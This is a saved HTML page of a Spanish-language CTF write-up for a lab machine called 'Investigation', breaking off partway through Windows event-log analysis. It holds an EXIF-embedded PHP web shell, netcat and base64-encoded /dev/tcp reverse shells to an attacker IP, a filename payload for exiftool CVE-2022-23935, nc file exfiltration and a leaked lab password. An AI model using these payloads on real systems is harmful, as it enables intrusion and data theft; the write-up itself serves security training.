@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">
+
+    <title>Máquina 1</title>
+
+
+    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
+    </head>
+
+
+<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>
+
+
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./investigastion.jpg"> <span class="mono authors"> <a href="https://secret.club/author/addison" itemprop="name">Investigation</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> Feb, 2023 </time><hr><main itemprop="articleBody" style="position: relative">
+
+
+
+
+<h2 id="1-comprobaci-n-del-sistema-operativo-">1. Comprobación del sistema operativo</h2>
+<pre><code><span class="hljs-selector-tag">python</span> <span class="hljs-selector-tag">whichSystem</span><span class="hljs-selector-class">.py</span> 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.11</span><span class="hljs-selector-class">.197</span>
+</code></pre><p>Tiene como salida:</p>
+<pre><code class="lang-bash">10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.11</span><span class="hljs-selector-class">.197</span> (<span class="hljs-selector-tag">ttl</span> <span class="hljs-selector-tag">-</span>&gt; 63): <span class="hljs-selector-tag">Linux</span>
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="2-descubrimiento-de-puertos-y-servicios-">2. Descubrimiento de puertos y servicios</h2>
+<pre><code>nmap -p- --open -sS --min-rate <span class="hljs-number">5000</span> -vvv -n -Pn <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.197</span>
+</code></pre><p>Obtenemos como salida:</p>
+<pre><code class="lang-bash">Scanned at 2023-03-08 09:36:46 CET for 11s
+Not shown: 65533 closed tcp ports (<span class="hljs-keyword">reset</span>)
+PORT   STATE SERVICE REASON
+<span class="hljs-number">22</span>/tcp <span class="hljs-keyword">open</span>  ssh     syn-ack ttl <span class="hljs-number">63</span>
+<span class="hljs-number">80</span>/tcp <span class="hljs-keyword">open</span>  <span class="hljs-keyword">http</span>    syn-ack ttl <span class="hljs-number">63</span>
+
+<span class="hljs-keyword">Read</span> <span class="hljs-keyword">data</span> files <span class="hljs-keyword">from</span>: /usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">bin</span>/../<span class="hljs-keyword">share</span>/nmap
+Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">11.20</span> seconds
+           <span class="hljs-keyword">Raw</span> packets sent: <span class="hljs-number">66415</span> (<span class="hljs-number">2.922</span>MB) | Rcvd: <span class="hljs-number">65705</span> (<span class="hljs-number">2.628</span>MB)
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="3-comprobamos-servicios-y-lanzamos-scripts-principales-contra-dichos-puertos-">3. Comprobamos servicios y lanzamos scripts principales contra dichos puertos</h2>
+<pre><code>nmap -sCV -p22,<span class="hljs-number">80</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.197</span>
+</code></pre><p>Obteniendo como salida:</p>
+<pre><code><span class="hljs-selector-tag">Host</span> <span class="hljs-selector-tag">is</span> <span class="hljs-selector-tag">up</span> (<span class="hljs-number">0.034s</span> latency).
+
+<span class="hljs-selector-tag">PORT</span>   <span class="hljs-selector-tag">STATE</span> <span class="hljs-selector-tag">SERVICE</span> <span class="hljs-selector-tag">VERSION</span>
+<span class="hljs-selector-tag">22</span>/<span class="hljs-selector-tag">tcp</span> <span class="hljs-selector-tag">open</span>  <span class="hljs-selector-tag">ssh</span>     <span class="hljs-selector-tag">OpenSSH</span> <span class="hljs-selector-tag">8</span><span class="hljs-selector-class">.2p1</span> <span class="hljs-selector-tag">Ubuntu</span> <span class="hljs-selector-tag">4ubuntu0</span><span class="hljs-selector-class">.5</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| <span class="hljs-selector-tag">ssh-hostkey</span>: 
+|   <span class="hljs-selector-tag">3072</span> <span class="hljs-selector-tag">2f</span><span class="hljs-selector-pseudo">:1e</span><span class="hljs-selector-pseudo">:63</span><span class="hljs-selector-pseudo">:06</span><span class="hljs-selector-pseudo">:aa</span><span class="hljs-selector-pseudo">:6e</span><span class="hljs-selector-pseudo">:bb</span><span class="hljs-selector-pseudo">:cc</span><span class="hljs-selector-pseudo">:0d</span><span class="hljs-selector-pseudo">:19</span><span class="hljs-selector-pseudo">:d4</span><span class="hljs-selector-pseudo">:15</span><span class="hljs-selector-pseudo">:26</span><span class="hljs-selector-pseudo">:74</span><span class="hljs-selector-pseudo">:c6</span><span class="hljs-selector-pseudo">:d9</span> (RSA)
+|   <span class="hljs-selector-tag">256</span> <span class="hljs-selector-tag">27</span><span class="hljs-selector-pseudo">:45</span><span class="hljs-selector-pseudo">:20</span><span class="hljs-selector-pseudo">:ad</span><span class="hljs-selector-pseudo">:d2</span><span class="hljs-selector-pseudo">:fa</span><span class="hljs-selector-pseudo">:a7</span><span class="hljs-selector-pseudo">:3a</span><span class="hljs-selector-pseudo">:83</span><span class="hljs-selector-pseudo">:73</span><span class="hljs-selector-pseudo">:d9</span><span class="hljs-selector-pseudo">:7c</span><span class="hljs-selector-pseudo">:79</span><span class="hljs-selector-pseudo">:ab</span><span class="hljs-selector-pseudo">:f3</span><span class="hljs-selector-pseudo">:0b</span> (ECDSA)
+|<span class="hljs-selector-tag">_</span>  <span class="hljs-selector-tag">256</span> <span class="hljs-selector-tag">42</span><span class="hljs-selector-pseudo">:45</span><span class="hljs-selector-pseudo">:eb</span><span class="hljs-selector-pseudo">:91</span><span class="hljs-selector-pseudo">:6e</span><span class="hljs-selector-pseudo">:21</span><span class="hljs-selector-pseudo">:02</span><span class="hljs-selector-pseudo">:06</span><span class="hljs-selector-pseudo">:17</span><span class="hljs-selector-pseudo">:b2</span><span class="hljs-selector-pseudo">:74</span><span class="hljs-selector-pseudo">:8b</span><span class="hljs-selector-pseudo">:c5</span><span class="hljs-selector-pseudo">:83</span><span class="hljs-selector-pseudo">:4f</span><span class="hljs-selector-pseudo">:e0</span> (ED25519)
+<span class="hljs-selector-tag">80</span>/<span class="hljs-selector-tag">tcp</span> <span class="hljs-selector-tag">open</span>  <span class="hljs-selector-tag">http</span>    <span class="hljs-selector-tag">Apache</span> <span class="hljs-selector-tag">httpd</span> <span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.4</span><span class="hljs-selector-class">.41</span>
+|<span class="hljs-selector-tag">_http-title</span>: <span class="hljs-selector-tag">Did</span> <span class="hljs-selector-tag">not</span> <span class="hljs-selector-tag">follow</span> <span class="hljs-selector-tag">redirect</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//eforenzics.htb/</span>
+|<span class="hljs-selector-tag">_http-server-header</span>: <span class="hljs-selector-tag">Apache</span>/<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.4</span><span class="hljs-selector-class">.41</span> (Ubuntu)
+<span class="hljs-selector-tag">Service</span> <span class="hljs-selector-tag">Info</span>: <span class="hljs-selector-tag">Host</span>: <span class="hljs-selector-tag">eforenzics</span><span class="hljs-selector-class">.htb</span>; <span class="hljs-selector-tag">OS</span>: <span class="hljs-selector-tag">Linux</span>; <span class="hljs-selector-tag">CPE</span>: <span class="hljs-selector-tag">cpe</span>:/<span class="hljs-selector-tag">o</span><span class="hljs-selector-pseudo">:linux</span><span class="hljs-selector-pseudo">:linux_kernel</span>
+</code></pre><p>Debemos añadir entonces <strong>eforenzics.htb</strong> al archivo <code>etc/hosts</code></p>
+<p>&nbsp;</p>
+<h2 id="4-observamos-la-p-gina-web">4. Observamos la página web</h2>
+<p>Vemos una página web en la que podemos subir una fotografía. Probamos a subir algún fichero del estilo <em>.php</em> pero vemos que solo deja subir archivos con extensiones <em>.png</em> y <em>.jpg</em>.</p>
+<p>&nbsp;</p>
+<h2 id="5-observamos-la-salida-que-produce-la-p-gina">5. Observamos la salida que produce la página</h2>
+<p>Una vez subida una foto, la aplicación muestra la salida del comando exiftool por pantalla de dicho archivo. Aquí se nos puede ocurrir meter algún comentario o descripción con algún payload dentro de la imagen. Esto lo podemos hacer con el siguiente comando:</p>
+<pre><code>exiftool -Comment="<span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">'Command:'</span>; <span class="hljs-keyword">if</span>($_POST){system($_POST[<span class="hljs-string">'cmd'</span>]);} <span class="hljs-comment"><span class="hljs-keyword">__halt_compiler</span>();" img.jpg</span></span>
+</code></pre><p>O creando directamente una revershell con el siguiente comando:</p>
+<pre><code>exiftool -DocumentName="<span class="php"><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">'nc 10.10.14.68 1234 -e /bin/bash'</span>); <span class="hljs-comment"><span class="hljs-keyword">__halt_compiler</span>(); ?&gt;</span></span>" test.jpg
+</code></pre><p>Pero si abrimos el archivo subido con la aplicación web, vemos la siguiente salida. No siendo capaces de ver el archivo subido directamente, sino una salida de la herramienta <strong>ExifTool</strong>:</p>
+<pre><code>ExifTool Version Number         : 12.37
+File Name                       : <span class="hljs-type">test.php.jpg</span>
+Directory                       : .
+File Size                       : 1515 <span class="hljs-type">KiB</span>
+File Modification Date/Time     : 2023:03:08 09:31:12+00:00
+File <span class="hljs-keyword">Access</span> Date/Time           : 2023:03:08 09:31:12+00:00
+File Inode Change Date/Time     : 2023:03:08 09:31:12+00:00
+File Permissions                : -<span class="hljs-type">rw</span>-r<span class="hljs-comment">--r--</span>
+File <span class="hljs-keyword">Type</span>                       <span class="hljs-type">: </span>PNG
+File <span class="hljs-keyword">Type</span> <span class="hljs-type">Extension             </span>: png
+MIME <span class="hljs-keyword">Type</span>                       <span class="hljs-type">: </span>image/png
+Image Width                     : 1024
+Image Height                    : 378
+Bit Depth                       : 8
+Color <span class="hljs-keyword">Type</span>                      <span class="hljs-type">: </span>RGB <span class="hljs-keyword">with</span> Alpha
+Compression                     : <span class="hljs-type">Deflate</span>/Inflate
+Filter                          : <span class="hljs-type">Adaptive</span>
+Interlace                       : <span class="hljs-type">Noninterlaced</span>
+Pixels Per Unit X               : 3937
+Pixels Per Unit Y               : 3937
+Pixel Units                     : <span class="hljs-type">meters</span>
+Exif Byte Order                 : <span class="hljs-type">Big</span>-endian (Motorola, MM)
+Document Name                   : &lt;?<span class="hljs-type">php</span> system(<span class="hljs-symbol">'nc</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">14.68</span> <span class="hljs-number">1234</span> -e /bin/bash'); __halt_compiler(); ?&gt;
+X Resolution                    : 72
+Y Resolution                    : 72
+Resolution Unit                 : <span class="hljs-type">inches</span>
+Y Cb Cr Positioning             : <span class="hljs-type">Centered</span>
+Image Size                      : 1024<span class="hljs-type">x378</span>
+Megapixels                      : 0.387
+</code></pre><p>&nbsp;</p>
+<h2 id="6-comprobar-la-versi-n-de-exiftool">6. Comprobar la versión de Exiftool</h2>
+<p>Se nos ocurre mirar si existe alguna vulnerabilidad para la version de Exiftool utilizada por la pagina, la cual es la 12.37. Encontramos que hay un CVE para dicha version, el CVE-2022-23935</p>
+<p>A mayores existe un proyecto en github en el cual ya crea un payload, y lanza un ncat escuchando. Se puede encontrar en el siguiente recurso <a href="https://github.com/0xFTW/CVE-2022-23935">https://github.com/0xFTW/CVE-2022-23935</a></p>
+<p>Ejecutamos entonces: </p>
+<pre><code>python3 CVE<span class="hljs-number">-2022</span><span class="hljs-number">-23935.</span>py <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.68</span> <span class="hljs-number">1234</span>
+</code></pre><p>Y subimos el archivo que se nos generó a la aplicacón web, el cual tiene el siguiente nombre:</p>
+<pre><code>'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjY4LzEyMzQgMD4mMQ== |<span class="hljs-string"> base64 -d </span>|<span class="hljs-string"> bash </span>|<span class="hljs-string">'</span>
+</code></pre><p>Lo subimos, lo abrimos y comprobamos que se nos crea una revershell con el usuario <strong>www-data</strong></p>
+<p>&nbsp;</p>
+<h2 id="7-comprobando-archivos-del-sistema">7. Comprobando archivos del sistema</h2>
+<p>Luego de comprobar que usuario/usuarios había en el sistema (sólo existía el usuario <code>smorton</code>), checkeamos los archivos del usuario observando que existe un archivo <em>.msg</em>, es decir, un archivo utilizado para la mensajería (normalmente de <em>Outlook</em>), en la ruta <code>/urs/local/investigation</code>:</p>
+<pre><code>-rw-rw-r-- <span class="hljs-number"> 1 </span>smorton  smorton <span class="hljs-number"> 1308160 </span>Oct <span class="hljs-number"> 1 </span>00:35 'Windows Event Logs for Analysis.msg'
+-rw-rw-r-- <span class="hljs-number"> 1 </span>www-data www-data      <span class="hljs-number"> 0 </span>Oct <span class="hljs-number"> 1 </span>00:40  analysed_log
+</code></pre><p>Por lo que lo enviamos a nuestra maquina para checkearlo, ejecutando para ello:</p>
+<pre><code>% nc -w <span class="hljs-number">3</span> <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.68</span> <span class="hljs-number">1234</span> &lt; 'Windows Event Logs for Analysis.msg'
+
+# nc -l -p <span class="hljs-number">1234</span> &gt; out.msg
+</code></pre><p>&nbsp;</p>
+<h2 id="8-observar-el-contenido-del-archivo">8. Observar el contenido del archivo</h2>
+<p>Intentamos observar su contenido, utilizando para ello la herramienta <strong>teamsgviewer</strong> (para archlinux), siendo capaces de ver el siguiente contenido:</p>
+<pre><code>Windows Event Logs <span class="hljs-keyword">for</span> Analysis 
+
+    Thomas Jones [thomas.jones@eforenzics.htb]  
+
+    evtx-logs.zip
+
+    Hi Steve,
+
+    Can you look <span class="hljs-keyword">through</span> these logs <span class="hljs-keyword">to</span> see <span class="hljs-keyword">if</span> our analysts have been logging <span class="hljs-keyword">on</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> inspection terminal. I'm concerned <span class="hljs-keyword">that</span> they are moving data <span class="hljs-keyword">on</span> <span class="hljs-keyword">to</span> production <span class="hljs-keyword">without</span> following our data transfer procedures. 
+
+    Regards.
+    Tom
+</code></pre><p>Es decir, nos indica que hay un archivo .zip en dicho correo</p>
+<p>&nbsp;</p>
+<h2 id="9-extracci-n-del-archivo-zip">9. Extracción del archivo .zip</h2>
+<p>Mediante la herramienta online encryptomatic (<a href="https://www.encryptomatic.com/viewer/">https://www.encryptomatic.com/viewer/</a>) somos capaces de descargar el archivo zip, el cual tiene el nombre: <strong>evtx-logs.zip</strong></p>
+<p>Si extraemos dicho archivo <em>zip</em> obtenemos un archivo <strong>security.evtx</strong>. Este es el tipo de archivo utilizado para los <em>EventLog</em> de <strong>Windows</strong>.</p>
+<p>&nbsp;</p>
+<h2 id="10-visualizaci-n-del-archivo-evtx">10. Visualización del archivo .evtx</h2>
+<p>Existen varios métodos para visualizar y analizar este tipo de archivos en <strong>archlinux</strong>. Nosotros en concreto vamos a utilizar la herramienta <strong>pyhton-evtx</strong> (<a href="https://github.com/williballenthin/python-evtx">https://github.com/williballenthin/python-evtx</a>) para convertir el archivo <em>.evtx</em> en <em>.xml</em>, ejecutando para ello el siguiente comando:</p>
+<pre><code>python /usr/bin/evtx_dump<span class="hljs-selector-class">.py</span> security<span class="hljs-selector-class">.evtx</span> &gt; evtx-to-xml.xml
+</code></pre><p>&nbsp;</p>
+<h2 id="11-obtenci-n-de-datos-relevantes-del-archivo-evtx">11. Obtención de datos relevantes del archivo .evtx</h2>
+<p>Buscamos por el archivo <em>.xml</em> algún dato o valor extraño. Para realizar esto podemos utilizar códigos normalmente utilizados por <strong>Windows</strong> como:</p>
+<ul>
+<li>4624 -&gt; Successful authentication</li>
+<li>4625 -&gt; Authentication error</li>
+<li>4634/4647 -&gt; Log off</li>
+<li>4672 -&gt; Login with admin permissions</li>
+</ul>
+<p>En dicho archivo encontramos el siguiente evento, en el podemos observar unas posibles credenciales en el campo <em>TargetUserName</em>.</p>
+<pre><code><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Event</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://schemas.microsoft.com/win/2004/08/events/event"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">System</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Provider</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"Microsoft-Windows-Security-Auditing"</span> <span class="hljs-attr">Guid</span>=<span class="hljs-string">"</span></span></span><span class="hljs-template-variable">{54849625-5478-4994-a5ba-3e3b0328c30d}</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Provider</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">EventID</span> <span class="hljs-attr">Qualifiers</span>=<span class="hljs-string">""</span>&gt;</span>4625<span class="hljs-tag">&lt;/<span class="hljs-name">EventID</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Version</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">Version</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Level</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">Level</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Task</span>&gt;</span>12544<span class="hljs-tag">&lt;/<span class="hljs-name">Task</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Opcode</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">Opcode</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Keywords</span>&gt;</span>0x8010000000000000<span class="hljs-tag">&lt;/<span class="hljs-name">Keywords</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">TimeCreated</span> <span class="hljs-attr">SystemTime</span>=<span class="hljs-string">"2022-08-01 19:15:15.374769"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">TimeCreated</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">EventRecordID</span>&gt;</span>11373331<span class="hljs-tag">&lt;/<span class="hljs-name">EventRecordID</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Correlation</span> <span class="hljs-attr">ActivityID</span>=<span class="hljs-string">"</span></span></span><span class="hljs-template-variable">{6a946884-a5bc-0001-d968-946abca5d801}</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">"</span> <span class="hljs-attr">RelatedActivityID</span>=<span class="hljs-string">""</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Correlation</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Execution</span> <span class="hljs-attr">ProcessID</span>=<span class="hljs-string">"628"</span> <span class="hljs-attr">ThreadID</span>=<span class="hljs-string">"6800"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Execution</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Channel</span>&gt;</span>Security<span class="hljs-tag">&lt;/<span class="hljs-name">Channel</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Computer</span>&gt;</span>eForenzics-DI<span class="hljs-tag">&lt;/<span class="hljs-name">Computer</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Security</span> <span class="hljs-attr">UserID</span>=<span class="hljs-string">""</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Security</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">System</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">EventData</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"SubjectUserSid"</span>&gt;</span>S-1-5-18<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"SubjectUserName"</span>&gt;</span>EFORENZICS-DI$<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"SubjectDomainName"</span>&gt;</span>WORKGROUP<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"SubjectLogonId"</span>&gt;</span>0x00000000000003e7<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"TargetUserSid"</span>&gt;</span>S-1-0-0<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"TargetUserName"</span>&gt;</span>Def@ultf0r3nz!csPa$$<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"TargetDomainName"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"Status"</span>&gt;</span>0xc000006d<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"FailureReason"</span>&gt;</span>%%2313<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"SubStatus"</span>&gt;</span>0xc0000064<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"LogonType"</span>&gt;</span>7<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"LogonProcessName"</span>&gt;</span>User32 <span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
